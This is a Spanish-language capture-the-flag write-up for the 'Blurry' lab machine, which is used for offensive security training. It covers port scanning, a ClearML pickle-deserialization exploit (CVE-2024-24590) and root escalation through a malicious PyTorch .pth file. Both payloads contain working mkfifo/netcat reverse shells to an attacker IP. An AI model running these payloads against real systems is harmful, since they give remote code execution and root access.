
# Blurry

<figure><img src="/files/8iWLroSZhT3JHCu0QITC" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Primer acceso</mark>

Añadimos la IP `10.10.11.19` a nuestro `/etc/hosts` y accedemos través del navegador. Llegamos a una página de login:

<figure><img src="/files/GzmWYiOJPL9YLsq7QcS4" alt=""><figcaption></figcaption></figure>

Cuando clickamos para escribir el usuario aparecen varios, lo que nos puede ayudar a acceder:

<figure><img src="/files/ytsnJlv3tJH6cYpjbISL" alt=""><figcaption></figcaption></figure>

Por ejemplo accedemos como `Chad Jippity` y llegamos a un dashboard. Aquí podríamos empezar a investigar y a buscar credenciales, pero antes vamos a escanear los puertos abiertos para ver otras vías de entrada.

<figure><img src="/files/T8pSCAsKLzRGpc1Pi1F3" alt=""><figcaption></figcaption></figure>

Como vemos, es un Clear ML, por lo que podemos buscar exploits públicos. Si accedemos a `Settings > Workspace` nos encontramos 2 credenciales:

```
 Key                    Usuario
 --------------------   ------------
 8TL83TDO2YXCQ4789DE4 	blurry
 43JQWWALPYM4QTJG5T6D 	149328d8025b
```

<figure><img src="/files/obiKxsNj7T6cwhMCrpoy" alt=""><figcaption></figcaption></figure>

Además encontramos la versión abajo de la página, lo que nos permitiría buscar exploits más específicos:

```
 WebApp: 1.13.1-426 • Server: 1.13.1-426 • API: 2.27 
```

## <mark style="color:purple;">Escaneo de puertos</mark>

```bash
sudo nmap -v -sS -sV -sC 10.10.11.19
```

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-favicon: Unknown favicon MD5: 2CBD65DC962D5BF762BCB815CBD5EFCC
|_http-title: ClearML
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Solo tiene 2 puertos abiertos, el 22 y el 80. Los típicos.

## <mark style="color:purple;">Fuzzing</mark>

Al fuzzear con dirsearch tampoco nos encontramos con nada relevante.

```bash
dirsearch -u http://app.blurry.htb -x 403,404,503,400

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/reports/http_app.blurry.htb/_24-08-08_15-44-53.txt

Target: http://app.blurry.htb/

[15:44:53] Starting: 
[15:45:12] 301 -  169B  - /app  ->  http://app.blurry.htb/app/
[15:45:13] 301 -  169B  - /assets  ->  http://app.blurry.htb/assets/
[15:45:20] 200 -  139B  - /env.js
[15:45:21] 200 -    6KB - /favicon.ico
[15:45:22] 200 -    2B  - /files/

Task Completed
```

## <mark style="color:purple;">Explotación</mark>

Haciendo un poco de research nos encontramos este exploit que en principio puede funcionar bastante bien:

{% embed url="<https://github.com/h3xm4n/ClearML-vulnerability-exploit-RCE-2024-CVE-2024-24590->" %}

En el repositorio encontramos las instrucciones de uso:

* Necesita acceso al espacio de trabajo del equipo
* Reemplace **IP** y **PUERTO** por su puerto de escucha y su IP
* Cambie el nombre del proyecto a un nombre de proyecto existente.

{% hint style="warning" %}
**Nota**: Tal vez necesites ejecutar el exploit un par de veces para que funcione
{% endhint %}

### Instrucciones

1. Haga clic en iniciar nuevo proyecto en clearml
2. Instalar clearml con `pip install clearml`
3. Obtenga las credenciales de ClearML Web (credenciales generadas al hacer clic en el nuevo proyecto)
4. clearml-init en tu terminal y pega las credenciales
5. nc-lnvp 4444
6. exploit.py

#### 1. Crear nuevo proyecto

<figure><img src="/files/GzWfScpl5vzGbxo0audb" alt=""><figcaption></figcaption></figure>

Como ya hay un proyecto creado en verdad podemos omitir este paso.

#### 2. Obtener credenciales

Para ejecutar este script necesitamos crear unas credenciales nuevas, ya que tenemos que proporcionar:

<figure><img src="/files/BsVwHoS56cjkQwbRme55" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/F4pOKgOft7so5YJQkqJf" alt=""><figcaption></figcaption></figure>

Necesitamos copiar todo ese código para pegarlo en el script de configuración de clearml.

{% hint style="warning" %}
**Importante**: necesitamos agregar esos 3 hosts a `/etc/hosts` para que funcione
{% endhint %}

#### 3. Instalar y configurar clearml

```bash
# Instalar entorno virtual
pip install virtualenv
virtualenv clearml_env
source clearml_env/bin/activate

# Instalar clearml
pip install clearml

# Verificar versión
python -c "import clearml; print(clearml.__version__)"
1.16.3
```

#### 4. Iniciar Clear ML

Necesitamos crear nuevas credenciales como ya vimos y pegar el código que nos dió. Para iniciar Clear ML solo tenemos que ejecutar `clearml-init`:

```
clearml-init
   
ClearML SDK setup process

Please create new clearml credentials through the settings page in your `clearml-server` web app (e.g. http://localhost:
8080//settings/workspace-configuration) 
Or create a free account at https://app.clear.ml/settings/workspace-configuration

In settings page, press "Create new credentials", then press "Copy to clipboard".

Paste copied configuration here:
api { 
    web_server: http://app.blurry.htb
    api_server: http://api.blurry.htb
    files_server: http://files.blurry.htb
    credentials {
        "access_key" = "PXY03JWTAEB34TZI83FB"
        "secret_key"  = "4EPc0uPmb1UJaasYyx3EP36swfa7SsStDumawm7AZNN8ZoQ1sX"
    }
}
Detected credentials key="PXY03JWTAEB34TZI83FB" secret="4EPc***"

ClearML Hosts configuration:
Web App: http://app.blurry.htb
API: http://api.blurry.htb
File Store: http://files.blurry.htb

Verifying credentials ...
Credentials verified!

New configuration stored in /home/kali/clearml.conf
ClearML setup completed successfully.
```

#### 5. Modificar script con nuestra IP y puerto

* Tambien necesitamos cambiar el nombre del proyecto a uno existente. En este caso solo tenemos un proyecto llamado Black Swan:

```python
from clearml import Task
import pickle, os

class RunCommand:
    def __reduce__(self):
        return (os.system, ('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.70 4444 >/tmp/f',))

command = RunCommand()

task = Task.init(project_name='Black Swan', task_name='pickle_artifact_upload', tags=["review"])
task.upload_artifact(name='pickle_artifact', artifact_object=command, retries=2, wait_on_upload=True, extension_name=".pkl")
```

#### 6. Listener de Netcat

```bash
nc -nlvp 4444                    
listening on [any] 4444 ...
```

#### 7. Ejecutar exploit

<figure><img src="/files/8VKrBGE3yXF1pny55XC2" alt=""><figcaption></figcaption></figure>

Funciona! Hemos obtenido una shell como el usuario jippity. Vamos a hacer un tratamiento de la TTY para movernos mejor por el sistema:

```bash
/usr/bin/python3 -c 'import pty; pty.spawn("/bin/bash")'
```

<figure><img src="/files/RR5hm0Th6VVcJREAD3Fh" alt=""><figcaption></figcaption></figure>

Obtenemos la user flag 🏆

## <mark style="color:purple;">Escalada de Privilegios</mark>

Lo primero que vamos a comprobar son los permisos del usuario jippity en el sistema:

```bash
jippity@blurry:~/automation$ sudo -l
sudo -l
Matching Defaults entries for jippity on blurry:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jippity may run the following commands on blurry:
    (root) NOPASSWD: /usr/bin/evaluate_model /models/*.pth
```

La salida del comando sudo -l indica que el usuario jippity tiene permisos para ejecutar el comando `/usr/bin/evaluate_model` como root sin necesidad de ingresar una contraseña. Además, puede ejecutar este comando con cualquier archivo `.pth` en el directorio `/models/`. Esto podría permitir una elevación de privilegios si podemos aprovechar alguna vulnerabilidad o mal uso del archivo `evaluate_model`.

### Creación de un archivo .pth Malicioso

Vamos a crear un script malicioso `malicious-model.py` en nuestro Kali Linux, lo ejecutamos en local y nos da un archivo `root.pth` que tendremos que enviar a la máquina:

```bash
import torch
import torch.nn as nn
import os

class MaliciousModel(nn.Module):
    # PyTorch's base class for all neural network modules
    def __init__(self):
        super(MaliciousModel, self).__init__()
        self.dense = nn.Linear(10, 1)
    
    # Define how the data flows through the model
    def forward(self, abdulrahman): # Passes input through the linear layer.
        return self.dense(abdulrahman)
   
    # Overridden __reduce__ Method
    def __reduce__(self):
        cmd = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.70 1234 >/tmp/f"
        return os.system, (cmd,)

# Create an instance of the model
malicious_model = MaliciousModel()

# Save the model using torch.save
torch.save(malicious_model, 'root.pth')
```

{% hint style="info" %}
Fijaros que nos devuelve una conexión de netcat a nuestra IP de atacante y al puerto 1234
{% endhint %}

#### Ejecutamos malicious\_model.py

```bash
pip install torch
python3 malicious_model.py

ls
clearml_env  exploit.py  malicious_model.py  root.pth
```

Una vez lo ejecutemos tendremos el archivo `root.pth` que vamos a enviar a la máquina.

```bash
jippity@blurry:~$ wget http://10.10.14.70/root.pth
wget http://10.10.14.70/root.pth

--2024-08-09 05:34:05--  http://10.10.14.70/root.pth
Connecting to 10.10.14.70:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 916 [application/octet-stream]
Saving to: ‘root.pth’

root.pth            100%[===================>]     916  --.-KB/s    in 0s      

2024-08-09 05:34:05 (76.4 MB/s) - ‘root.pth’ saved [916/916]

jippity@blurry:~$ ls
automation  clearml.conf  exploit.sh  root.pth  user.txt

jippity@blurry:~$ cp root.pth /models

jippity@blurry:~$ cd /models

jippity@blurry:/models$ ls
demo_model.pth  evaluate_model.py  root.pth
```

Una vez que tenemos el archivo `root.pth` en la máquina solo tenemos que abrir un listener con netcat por el puerto 1234 que le indicamos, mover el archivo `root.pth` al directorio `/models` y ejecutar el script con sudo, pasándole `root.pth` como argumento:

```bash
cp root.pth /models  
sudo /usr/bin/evaluate_model /models/root.pth 
```

<figure><img src="/files/D9esVpXsmfeAypGSQQKY" alt=""><figcaption></figcaption></figure>

Buum! Recibimos una shell como root y obtenemos la root flag! 🏆
